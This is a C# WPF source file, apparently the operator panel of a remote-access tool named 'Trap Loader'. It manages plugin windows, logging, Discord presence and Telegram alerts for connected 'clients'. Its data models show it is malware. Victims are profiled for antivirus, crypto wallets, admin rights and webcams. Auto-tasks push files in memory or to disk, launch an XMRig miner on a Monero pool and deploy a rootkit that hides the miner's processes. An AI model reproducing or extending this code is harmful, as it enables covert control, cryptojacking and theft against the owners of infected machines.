                string capturedWindowKey = windowKey;

                pluginWindow.Closed += async (s, ev) =>
                {
                    if (!_pluginWindows.Remove(capturedWindowKey))
                        return;

                    var managedClients = multiPlugin.GetManagedClientIds();
                    foreach (var cid in managedClients)
                        await _pluginHost.StopPluginForClient(cid, pluginId);

                    multiPlugin.RemoveAllClients();

                    UpdateActivePluginCount();
                    AppendLog($"Closed multi-client plugin '{plugin.DisplayName}'.");
                };

                _pluginWindows[capturedWindowKey] = pluginWindow;
                pluginWindow.Show();
                pluginWindow.Activate();

                UpdateActivePluginCount();
                AppendLog($"Opened shared '{plugin.DisplayName}' window with {clients.Count} client(s).");
            });
        }

        private async Task OpenPluginForClient(string clientId, string pluginId)
        {
            string windowKey = $"{clientId}:{pluginId}";
            await OpenPluginWindowForClient(clientId, pluginId, windowKey);
        }

        private static bool ShouldOpenPluginInWindow(string pluginId)
        {
            return true;
        }

        private async Task OpenPluginWindowForClient(string clientId, string pluginId, string tabKey)
        {
            if (_pluginWindows.TryGetValue(tabKey, out var existingWindow))
            {
                Dispatcher.BeginInvoke(() =>
                {
                    if (existingWindow.WindowState == WindowState.Minimized)
                        existingWindow.WindowState = WindowState.Normal;
                    existingWindow.Activate();
                    existingWindow.Focus();
                });
                AppendLog($"Plugin '{pluginId}' already open for '{clientId}'. Focused existing window.");
                return;
            }

            var context = await _pluginHost.StartPluginForClient(clientId, pluginId);
            if (context == null)
            {
                AppendLog($"Failed to start plugin '{pluginId}' for '{clientId}'.");
                return;
            }

            if (!_pluginHost.LoadedPlugins.TryGetValue(pluginId, out var plugin))
            {
                AppendLog($"Plugin '{pluginId}' not found in loaded plugins.");
                return;
            }

            Dispatcher.BeginInvoke(() =>
            {
                if (_pluginWindows.TryGetValue(tabKey, out var alreadyOpenWindow))
                {
                    if (alreadyOpenWindow.WindowState == WindowState.Minimized)
                        alreadyOpenWindow.WindowState = WindowState.Normal;
                    alreadyOpenWindow.Activate();
                    return;
                }

                UserControl pluginUI;
                try
                {
                    pluginUI = plugin.CreateUI(context);
                }
                catch (Exception ex)
                {
                    AppendLog($"Failed to create UI for plugin '{pluginId}': {ex.Message}");
                    return;
                }

                var pluginWindow = new Window
                {
                    Title = $"{plugin.DisplayName} — {clientId}",
                    Width = 800,
                    Height = 580,
                    MinWidth = 500,
                    MinHeight = 360,
                    Owner = this,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Content = pluginUI,
                    Tag = tabKey
                };
                pluginWindow.SetResourceReference(Window.BackgroundProperty, "BackgroundBrush");
                pluginWindow.SetResourceReference(Window.ForegroundProperty, "TextPrimaryBrush");

                string capturedClientId = clientId;
                string capturedPluginId = pluginId;
                string capturedTabKey = tabKey;

                pluginWindow.Closed += async (s, ev) =>
                {
                    if (!_pluginWindows.Remove(capturedTabKey))
                        return;

                    try
                    {
                        await _pluginHost.StopPluginForClient(capturedClientId, capturedPluginId);
                    }
                    catch { }

                    UpdateActivePluginCount();
                    AppendLog($"Closed plugin '{capturedPluginId}' for client '{capturedClientId}'.");
                };

                _pluginWindows[capturedTabKey] = pluginWindow;
                pluginWindow.Show();
                pluginWindow.Activate();

                UpdateActivePluginCount();
                AppendLog($"Opened '{plugin.DisplayName}' for client '{clientId}' in a separate window.");
            });
        }

        private void RemovePluginTabsForClient(string clientId)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var windowsToRemove = _pluginWindows
                    .Where(kvp => kvp.Key.StartsWith($"{clientId}:"))
                    .ToList();

                foreach (var kvp in windowsToRemove)
                {
                    _pluginWindows.Remove(kvp.Key);
                    try { kvp.Value.Close(); } catch { }
                }

                foreach (var pluginKvp in _pluginHost.LoadedPlugins)
                {
                    if (pluginKvp.Value is IMultiClientPlugin multiPlugin)
                        multiPlugin.RemoveClient(clientId);
                }

                int closedCount = windowsToRemove.Count;
                if (closedCount > 0)
                {
                    AppendLog($"Closed {closedCount} plugin view(s) for disconnected client '{clientId}'.");

                    if (tabControl.SelectedItem == null)
                        tabControl.SelectedItem = clientsTab;

                    UpdateActivePluginCount();
                }
            });
        }

        private async Task StopAllPluginsForSelectedClients()
        {
            var selectedClients = ClientItems.Where(c => c.IsSelected).ToList();

            if (selectedClients.Count == 0 && clientList.SelectedItem is ClientItem singleClient)
                selectedClients = new List<ClientItem> { singleClient };

            if (selectedClients.Count == 0)
            {
                AppendLog("No clients selected.");
                return;
            }

            foreach (var client in selectedClients)
            {
                var activePlugins = _pluginHost.GetActivePlugins(client.Name);

                foreach (var pluginId in activePlugins)
                {
                    string windowKey = $"{client.Name}:{pluginId}";
                    if (_pluginWindows.TryGetValue(windowKey, out var win))
                    {
                        win.Close();
                    }
                    else
                    {
                        await _pluginHost.StopPluginForClient(client.Name, pluginId);
                    }
                }

                foreach (var pluginKvp in _pluginHost.LoadedPlugins)
                {
                    if (pluginKvp.Value is IMultiClientPlugin multiPlugin)
                    {
                        multiPlugin.RemoveClient(client.Name);
                        await _pluginHost.StopPluginForClient(client.Name, pluginKvp.Key);
                    }
                }

                if (activePlugins.Count > 0)
                    AppendLog($"Stopped {activePlugins.Count} plugin(s) for '{client.Name}'.");
                else
                    AppendLog($"No active plugins for '{client.Name}'.");
            }
        }

        private void ShowActivePluginsForSelectedClients()
        {
            var selectedClients = ClientItems.Where(c => c.IsSelected).ToList();

            if (selectedClients.Count == 0 && clientList.SelectedItem is ClientItem singleClient)
                selectedClients = new List<ClientItem> { singleClient };

            if (selectedClients.Count == 0)
            {
                AppendLog("No clients selected.");
                return;
            }

            foreach (var client in selectedClients)
            {
                var activePlugins = _pluginHost.GetActivePlugins(client.Name);

                if (activePlugins.Count == 0)
                    AppendLog($"Client '{client.Name}': No active plugins.");
                else
                    AppendLog($"Client '{client.Name}': Active plugins: {string.Join(", ", activePlugins)}");
            }
        }

        // ==================== PLUGIN TAB XAML HANDLERS ====================

        private async void ReloadPluginsButton_Click(object sender, RoutedEventArgs e)
        {
            AppendLog("Reloading plugins...");
            await _pluginManager.LoadAllPlugins();
            BuildClientContextMenu();
            RefreshPluginCards();
            AppendLog($"Plugins reloaded. {_pluginHost.LoadedPlugins.Count} plugin(s) available.");
        }

        private void OpenPluginsFolderButton_Click(object sender, RoutedEventArgs e)
        {
            string pluginDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Plugins");
            if (!Directory.Exists(pluginDir))
                Directory.CreateDirectory(pluginDir);

            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = pluginDir,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                AppendLog($"Failed to open plugins folder: {ex.Message}");
            }
        }

        private void RefreshPluginCards()
        {
            Dispatcher.BeginInvoke(() =>
            {
                pluginCardsPanel.Children.Clear();

                pluginCountLabel.Text =
                    $"{_pluginHost.LoadedPlugins.Count} plugin(s) available. Right-click a client to launch.";

                foreach (var kvp in _pluginHost.LoadedPlugins)
                {
                    var card = CreatePluginCard(kvp.Value);
                    pluginCardsPanel.Children.Add(card);
                }

                UpdateActivePluginCount();
            });
        }

        public void UpdateActivePluginCount()
        {
            Dispatcher.BeginInvoke(() =>
            {
                if (activePluginCountLbl == null) return;

                int count = _pluginWindows.Count;
                activePluginCountLbl.Text = count == 1 ? "1 active" : $"{count} active";
            });
        }

        private Border CreatePluginCard(IServerPlugin plugin)
        {
            var card = new Border
            {
                CornerRadius = new CornerRadius(6),
                Padding = new Thickness(16),
                Margin = new Thickness(0, 0, 0, 8)
            };
            card.SetResourceReference(Border.BackgroundProperty, "SurfaceBrush");
            card.SetResourceReference(Border.BorderBrushProperty, "BorderBrush");
            card.BorderThickness = new Thickness(1);

            var cardContent = new Grid();
            cardContent.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            cardContent.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

            var infoPanel = new StackPanel();

            var nameRow = new StackPanel { Orientation = Orientation.Horizontal };
            nameRow.Children.Add(new TextBlock
            {
                Text = "🔌",
                FontSize = 16,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 8, 0)
            });

            var nameText = new TextBlock
            {
                Text = plugin.DisplayName,
                FontSize = 16,
                FontWeight = FontWeights.SemiBold,
                VerticalAlignment = VerticalAlignment.Center
            };
            nameText.SetResourceReference(TextBlock.ForegroundProperty, "TextPrimaryBrush");
            nameRow.Children.Add(nameText);

            var versionText = new TextBlock
            {
                Text = $"  v{plugin.Version}",
                FontSize = 11,
                VerticalAlignment = VerticalAlignment.Center
            };
            versionText.SetResourceReference(TextBlock.ForegroundProperty, "TextSecondaryBrush");
            nameRow.Children.Add(versionText);

            if (plugin is IMultiClientPlugin)
            {
                var multiTag = new TextBlock
                {
                    Text = "  [Multi-Client]",
                    FontSize = 10,
                    VerticalAlignment = VerticalAlignment.Center,
                    FontStyle = FontStyles.Italic
                };
                multiTag.SetResourceReference(TextBlock.ForegroundProperty, "WarningBrush");
                nameRow.Children.Add(multiTag);
            }

            infoPanel.Children.Add(nameRow);

            var descText = new TextBlock
            {
                Text = plugin.Description,
                FontSize = 12,
                Margin = new Thickness(0, 4, 0, 4),
                TextWrapping = TextWrapping.Wrap
            };
            descText.SetResourceReference(TextBlock.ForegroundProperty, "TextSecondaryBrush");
            infoPanel.Children.Add(descText);

            string hasClientCode;
            try
            {
                hasClientCode = string.IsNullOrEmpty(plugin.GetClientCode()) ? "None" : "Yes";
            }
            catch
            {
                hasClientCode = "Error";
            }

            var idText = new TextBlock
            {
                Text = $"ID: {plugin.PluginId}   |   Client code: {hasClientCode}",
                FontSize = 11,
                FontFamily = new FontFamily("Consolas")
            };
            idText.SetResourceReference(TextBlock.ForegroundProperty, "DisabledBrush");
            infoPanel.Children.Add(idText);

            Grid.SetColumn(infoPanel, 0);
            cardContent.Children.Add(infoPanel);

            var launchButton = new Button
            {
                Content = "▶ Launch",
                Padding = new Thickness(16, 8, 16, 8),
                Cursor = Cursors.Hand,
                VerticalAlignment = VerticalAlignment.Center,
                FontSize = 12,
                FontWeight = FontWeights.SemiBold,
                ToolTip = "Launch for selected client(s)",
                Style = (Style)FindResource("PrimaryButton")
            };

            string capturedPluginId = plugin.PluginId;
            launchButton.Click += async (s, args) =>
            {
                await LaunchPluginForSelectedClients(capturedPluginId);
            };

            Grid.SetColumn(launchButton, 1);
            cardContent.Children.Add(launchButton);

            card.Child = cardContent;

            card.MouseEnter += (s, ev) =>
                card.SetResourceReference(Border.BorderBrushProperty, "PrimaryBrush");
            card.MouseLeave += (s, ev) =>
                card.SetResourceReference(Border.BorderBrushProperty, "BorderBrush");

            return card;
        }

        // ==================== LOG SYSTEM (BATCHED + CAPPED) ====================

        public void AppendLog(string message)
        {
            if (logTextBox == null) return;

            string timestamp = DateTime.Now.ToString("HH:mm:ss");
            _pendingLogMessages.Enqueue($"[{timestamp}] {message}");

            if (!_logFlushScheduled)
            {
                _logFlushScheduled = true;
                Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(FlushLogMessages));
            }
        }

        private void FlushLogMessages()
        {
            _logFlushScheduled = false;

            if (logTextBox == null) return;

            int count = 0;
            var sb = new StringBuilder();

            while (count < LogBatchSize && _pendingLogMessages.TryDequeue(out var msg))
            {
                sb.AppendLine(msg);
                count++;
            }

            if (count == 0) return;

            logTextBox.AppendText(sb.ToString());

            if (logTextBox.LineCount > MaxLogLines)
            {
                int removeUpTo = logTextBox.GetCharacterIndexFromLineIndex(logTextBox.LineCount - MaxLogLines);
                if (removeUpTo > 0)
                {
                    logTextBox.Select(0, removeUpTo);
                    logTextBox.SelectedText = "";
                    logTextBox.Select(logTextBox.Text.Length, 0);
                }
            }

            logTextBox.ScrollToEnd();

            if (!_pendingLogMessages.IsEmpty)
            {
                _logFlushScheduled = true;
                Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(FlushLogMessages));
            }
        }

        // ==================== OTHER UTILITY ====================

        private void UpdateStatus(string message)
        {
            if (statusTextBox == null) return;
            Dispatcher.BeginInvoke(() => statusTextBox.Text = message);
        }

        public void UpdateClientCount(int explicitCount = -1)
        {
            Dispatcher.BeginInvoke(() =>
            {
                int count = explicitCount >= 0 ? explicitCount : ClientItems.Count;
                clientCountLbl.Text = count.ToString();
            });
            UpdateDiscordPresence();
        }

        // ==================== TELEGRAM NOTIFICATION ====================

        private async Task SendTelegramNotification(string message)
        {
            if (chkTelegramNotify.IsChecked != true) return;
            string token = telegramTokenBox.Password;
            string chatId = telegramChatIdBox.Text;
            if (string.IsNullOrWhiteSpace(token) || string.IsNullOrWhiteSpace(chatId)) return;

            try
            {
                string url = $"https://api.telegram.org/bot{token}/sendMessage";
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("chat_id", chatId),
                    new KeyValuePair<string, string>("text", message),
                    new KeyValuePair<string, string>("parse_mode", "HTML")
                });
                var response = await _httpClient.PostAsync(url, content);
                if (!response.IsSuccessStatusCode)
                    AppendLog($"Telegram notify failed: {response.StatusCode}");
            }
            catch (Exception ex)
            {
                AppendLog($"Telegram notify error: {ex.Message}");
            }
        }

        // ==================== DISCORD RICH PRESENCE ====================

        private void InitDiscordRpc()
        {
            try
            {
                _discordClient = new DiscordRpcClient("1338769562756640828");
                _discordClient.OnReady += (s, e) =>
                {
                    Dispatcher.BeginInvoke(() =>
                    {
                        discordStatusText.Text = $"Connected as {e.User.Username}";
                        discordStatusText.Foreground = System.Windows.Media.Brushes.LightGreen;
                        discordStatusDot.Fill = System.Windows.Media.Brushes.LightGreen;
                    });
                };
                _discordClient.OnError += (s, e) =>
                {
                    Dispatcher.BeginInvoke(() =>
                    {
                        discordStatusText.Text = $"Error: {e.Message}";
                        discordStatusText.Foreground = System.Windows.Media.Brushes.Orange;
                        discordStatusDot.Fill = System.Windows.Media.Brushes.Orange;
                    });
                };
                _discordClient.OnConnectionFailed += (s, e) =>
                {
                    Dispatcher.BeginInvoke(() =>
                    {
                        discordStatusText.Text = "Connection failed";
                        discordStatusText.Foreground = System.Windows.Media.Brushes.OrangeRed;
                        discordStatusDot.Fill = System.Windows.Media.Brushes.OrangeRed;
                    });
                };
                _discordClient.Initialize();
                _discordStartTime = DateTime.UtcNow;

                if (chkDiscordRpc.IsChecked == true)
                    UpdateDiscordPresence();
                else
                    _discordClient.ClearPresence();
            }
            catch (Exception ex)
            {
                AppendLog($"Discord RPC init error: {ex.Message}");
            }
        }

        private void UpdateDiscordPresence()
        {
            try
            {
                if (_discordClient == null || !_discordClient.IsInitialized) return;
                if (chkDiscordRpc.IsChecked != true)
                {
                    _discordClient.ClearPresence();
                    return;
                }

                int count = ClientItems.Count;
                _discordClient.SetPresence(new RichPresence
                {
                    Details = "Trap Loader v1.1",
                    State = $"{count} client(s) connected",
                    Timestamps = new Timestamps { Start = _discordStartTime },
                    Assets = new Assets
                    {
                        LargeImageKey = "icon",
                        LargeImageText = "Trap Loader"
                    }
                });
            }
            catch { }
        }

        private void ChkDiscordRpc_Checked(object sender, RoutedEventArgs e)
        {
            UpdateDiscordPresence();
            SaveSettings();
        }

        private void ChkDiscordRpc_Unchecked(object sender, RoutedEventArgs e)
        {
            _discordClient?.ClearPresence();
            discordStatusText.Text = "Disconnected";
            discordStatusText.Foreground = System.Windows.Media.Brushes.Gray;
            discordStatusDot.Fill = System.Windows.Media.Brushes.Gray;
            SaveSettings();
        }

        private async void BtnTestTelegram_Click(object sender, RoutedEventArgs e)
        {
            await SendTelegramNotification("Test notification from Trap Loader");
            AppendLog("Telegram test notification sent.");
        }

        private void BtnRecheckDiscord_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                _discordClient?.Dispose();
                _discordClient = null;
                InitDiscordRpc();
                AppendLog("Discord RPC reinitialized.");
            }
            catch (Exception ex)
            {
                AppendLog($"Discord RPC recheck error: {ex.Message}");
            }
        }

        private void BtnChangeCert_Click(object sender, RoutedEventArgs e)
        {
            if (_tcpServer != null)
            {
                AppendLog("Stop the server before changing the certificate.");
                return;
            }

            var dialog = new CertificateDialog { Owner = this };
            if (dialog.ShowDialog() == true)
            {
                _serverCertificate = dialog.Certificate;
                UpdateCertUI();
                AppendLog("Certificate changed. Existing client stubs are now invalid — rebuild the client EXE.");
            }
        }

        private void UpdateCertUI()
        {
            Dispatcher.BeginInvoke(() =>
            {
                if (_serverCertificate != null)
                {
                    certStatusDot.Fill = (SolidColorBrush)FindResource("SuccessBrush");
                    certStatusText.Text = "Certificate loaded";
                    string cn = _serverCertificate.Subject?.Replace("CN=", "") ?? "Unknown";
                    certSubjectLabel.Text = "Subject: " + cn;
                    certExpiryLabel.Text = "Expires: " + _serverCertificate.GetExpirationDateString();
                    certHashLabel.Text = "Thumbprint: " + _serverCertificate.Thumbprint;
                }
                else if (CertificateManager.CertificateExists())
                {
                    certStatusDot.Fill = (SolidColorBrush)FindResource("WarningBrush");
                    certStatusText.Text = "Certificate exists but could not be loaded";
                    certSubjectLabel.Text = "";
                    certExpiryLabel.Text = "Try re-importing the .pfx file";
                    certHashLabel.Text = "";
                }
                else
                {
                    certStatusDot.Fill = (SolidColorBrush)FindResource("DangerBrush");
                    certStatusText.Text = "No certificate installed";
                    certSubjectLabel.Text = "Server cannot start without a certificate";
                    certExpiryLabel.Text = "";
                    certHashLabel.Text = "";
                }
            });
        }

        private void UpdateLastFileLabel()
        {
            Dispatcher.BeginInvoke(() =>
            {
                if (string.IsNullOrEmpty(_selectedFilePath) || !File.Exists(_selectedFilePath))
                    lastFileLbl.Text = "Last file: None";
                else
                    lastFileLbl.Text = $"Last file: {Path.GetFileName(_selectedFilePath)}";
            });
        }

        private void SyncPanelValues()
        {
            if (!string.IsNullOrWhiteSpace(builderPortTextBox.Text))
                listenportTextBox.Text = builderPortTextBox.Text;
            else if (!string.IsNullOrWhiteSpace(listenportTextBox.Text))
                builderPortTextBox.Text = listenportTextBox.Text;
        }

        private static string TruncateString(string value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return "";
            return value.Length <= maxLength ? value : value.Substring(0, maxLength) + "…";
        }

        // ==================== DATA MODELS ====================

        public class ClientItem : INotifyPropertyChanged
        {
            private string _osVersion;
            private string _machineName;
            private string _antivirusProducts;
            private string _cryptoWallet;
            private string _isAdmin;
            private string _hasWebcam;
            private string _activeWindow;
            private bool _isSelected;

            public string Name { get; set; }

            public string OSVersion
            {
                get => _osVersion;
                set { _osVersion = value; OnPropertyChanged(nameof(OSVersion)); }
            }

            public string MachineName
            {
                get => _machineName;
                set { _machineName = value; OnPropertyChanged(nameof(MachineName)); }
            }

            public string AntivirusProducts
            {
                get => _antivirusProducts;
                set { _antivirusProducts = value; OnPropertyChanged(nameof(AntivirusProducts)); }
            }

            public string CryptoWallet
            {
                get => _cryptoWallet;
                set { _cryptoWallet = value; OnPropertyChanged(nameof(CryptoWallet)); }
            }

            public string IsAdmin
            {
                get => _isAdmin;
                set { _isAdmin = value; OnPropertyChanged(nameof(IsAdmin)); }
            }

            public string HasWebcam
            {
                get => _hasWebcam;
                set { _hasWebcam = value; OnPropertyChanged(nameof(HasWebcam)); }
            }

            public string ActiveWindow
            {
                get => _activeWindow;
                set { _activeWindow = value; OnPropertyChanged(nameof(ActiveWindow)); }
            }

            public bool IsSelected
            {
                get => _isSelected;
                set
                {
                    if (_isSelected != value)
                    {
                        _isSelected = value;
                        OnPropertyChanged(nameof(IsSelected));
                    }
                }
            }

            public ClientItem(string name, string osVersion, string machineName,
                string antivirusProducts, string walletNames, string isAdmin, string hasWebcam, bool isSelected)
            {
                Name = name;
                OSVersion = osVersion;
                MachineName = machineName;
                AntivirusProducts = antivirusProducts;
                CryptoWallet = walletNames;
                IsAdmin = isAdmin;
                HasWebcam = hasWebcam;
                IsSelected = isSelected;
            }

            public event PropertyChangedEventHandler PropertyChanged;

            protected void OnPropertyChanged(string propertyName)
                => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }

        public class ClientInfoData
        {
            public string OSVersion { get; set; }
            public string MachineName { get; set; }
            public string AntivirusProducts { get; set; }
            public string CryptoWallet { get; set; }
            public string IsAdmin { get; set; }
            public string HasWebcam { get; set; }
        }

        public enum AutoTaskAction { SendFile, StartMiner, DeployRootkit }

        public class AutoTaskItem : INotifyPropertyChanged
        {
            private bool _isEnabled;
            private int _runCount;
            private DateTime? _lastRun;
            private string _lastClient;
            private bool _isSelected;
            private bool _useInMemory;
            private string _name;
            private string _filePath;

            public string Id { get; set; }
            public AutoTaskAction ActionType { get; set; }
            public string Name
            {
                get => ActionType == AutoTaskAction.StartMiner ? "XMRig Miner" :
                       ActionType == AutoTaskAction.DeployRootkit ? "$tp Rootkit" : _name;
                set => _name = value;
            }
            public string FilePath
            {
                get => ActionType == AutoTaskAction.StartMiner ? (_wallet ?? "") :
                       ActionType == AutoTaskAction.DeployRootkit ? (_rootkitProcessName ?? "") : _filePath;
                set => _filePath = value;
            }

            // Miner config fields
            private string _pool = "pool.supportxmr.com:3333";
            private string _wallet = "";
            private string _worker = "";
            private int _threadCount = 50;

            public string Pool { get => _pool; set => _pool = value; }
            public string Wallet { get => _wallet; set => _wallet = value; }
            public string Worker { get => _worker; set => _worker = value; }
            public int ThreadCount { get => _threadCount; set => _threadCount = value; }

            // Rootkit config fields
            private string _rootkitProcessName = "xmrig*";

            public string RootkitProcessName { get => _rootkitProcessName; set => _rootkitProcessName = value; }

            public bool IsEnabled
            {
                get => _isEnabled;
                set
                {
                    if (_isEnabled != value)
                    {
                        _isEnabled = value;
                        OnPropertyChanged(nameof(IsEnabled));
                        OnPropertyChanged(nameof(Status));
                    }
                }
            }

            public bool UseInMemory
            {
                get => _useInMemory;
                set
                {
                    if (_useInMemory != value)
                    {
                        _useInMemory = value;
                        OnPropertyChanged(nameof(UseInMemory));
                        OnPropertyChanged(nameof(ExecModeDisplay));
                        OnPropertyChanged(nameof(Status));
                    }
                }
            }

            public int RunCount
            {
                get => _runCount;
                set
                {
                    if (_runCount != value)
                    {
                        _runCount = value;
                        OnPropertyChanged(nameof(RunCount));
                        OnPropertyChanged(nameof(RunInfo));
                    }
                }
            }

            public DateTime? LastRun
            {
                get => _lastRun;
                set
                {
                    if (_lastRun != value)
                    {
                        _lastRun = value;
                        OnPropertyChanged(nameof(LastRun));
                        OnPropertyChanged(nameof(RunInfo));
                    }
                }
            }

            public string LastClient
            {
                get => _lastClient;
                set
                {
                    if (_lastClient != value)
                    {
                        _lastClient = value;
                        OnPropertyChanged(nameof(LastClient));
                        OnPropertyChanged(nameof(RunInfo));
                    }
                }
            }

            public bool IsSelected
            {
                get => _isSelected;
                set
                {
                    if (_isSelected != value)
                    {
                        _isSelected = value;
                        OnPropertyChanged(nameof(IsSelected));
                    }
                }
            }

            public string Status
            {
                get
                {
                    if (ActionType == AutoTaskAction.StartMiner)
                    {
                        string enabledStr = IsEnabled ? "✓ Enabled" : "⊗ Disabled";
                        return $"{enabledStr} | Start Miner";
                    }
                    if (ActionType == AutoTaskAction.DeployRootkit)
                    {
                        string enabledStr = IsEnabled ? "✓ Enabled" : "⊗ Disabled";
                        return $"{enabledStr} | Deploy Rootkit";
                    }
                    string enabledStr2 = IsEnabled ? "✓ Enabled" : "⊗ Disabled";
                    string modeStr2 = UseInMemory ? "⚡ In-Memory" : "💾 Disk";
                    return $"{enabledStr2} | {modeStr2}";
                }
            }

            public string ExecModeDisplay
            {
                get
                {
                    if (ActionType == AutoTaskAction.StartMiner)
                        return $"⚡ {_threadCount}% CPU";
                    if (ActionType == AutoTaskAction.DeployRootkit)
                        return $"🔒 {_rootkitProcessName}";
                    return UseInMemory ? "⚡ In-Memory" : "💾 Drop to Disk";
                }
            }

            public string RunInfo
            {
                get
                {
                    if (RunCount == 0) return "Never run";

                    string lastRunStr = LastRun.HasValue
                        ? LastRun.Value.ToString("yyyy-MM-dd HH:mm:ss")
                        : "Unknown";

                    string clientStr = !string.IsNullOrEmpty(LastClient) ? LastClient : "Unknown";

                    return $"{RunCount} run(s) | Last: {lastRunStr} on {clientStr}";
                }
            }

            public AutoTaskItem(string id, string name, string filePath, bool isEnabled,
                int runCount, DateTime? lastRun, string lastClient, bool useInMemory = false,
                AutoTaskAction actionType = AutoTaskAction.SendFile,
                string pool = null, string wallet = null, string worker = null, int threadCount = 50,
                string rootkitProcessName = null)
            {
                Id = id;
                _name = name;
                _filePath = filePath;
                IsEnabled = isEnabled;
                RunCount = runCount;
                LastRun = lastRun;
                LastClient = lastClient;
                UseInMemory = useInMemory;
                ActionType = actionType;
                if (pool != null) _pool = pool;
                if (wallet != null) _wallet = wallet;
                if (worker != null) _worker = worker;
                _threadCount = threadCount;
                if (rootkitProcessName != null) _rootkitProcessName = rootkitProcessName;
            }

            public event PropertyChangedEventHandler PropertyChanged;

            protected void OnPropertyChanged(string propertyName)
                => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }

        public class AutoTaskData
        {
            public string Id { get; set; }
            public string Name { get; set; }
            public string FilePath { get; set; }
            public bool IsEnabled { get; set; }
            public int RunCount { get; set; }
            public DateTime? LastRun { get; set; }
            public string LastClient { get; set; }
            public bool UseInMemory { get; set; }
            public int ActionType { get; set; }
            public string Pool { get; set; }
            public string Wallet { get; set; }
            public string Worker { get; set; }
            public int ThreadCount { get; set; }
            public string RootkitProcessName { get; set; }
        }
    }
}
